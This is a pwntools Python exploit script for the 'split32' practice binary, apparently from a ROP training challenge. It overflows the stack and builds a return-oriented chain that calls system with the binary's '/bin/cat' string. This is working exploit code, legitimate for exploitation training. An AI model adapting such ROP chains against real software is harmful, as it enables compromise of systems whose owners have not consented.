#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template split32
from pwn import *
import offset

# Set up pwntools for the correct architecture
exe = context.binary = ELF('split32')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)



def get_offset():
    io = start()
    pad = offset.offset(io)
    io.close()
    return pad


io = start()

pad = get_offset()
info("Padding: %d", pad)

system_call = 0x0804861a

rop = ROP(exe)
rop.raw(b"\x90" * pad)
rop.raw(system_call)
rop.raw(next(exe.search(b"/bin/cat")))

io.sendlineafter(b"> ", rop.chain())

io.interactive()

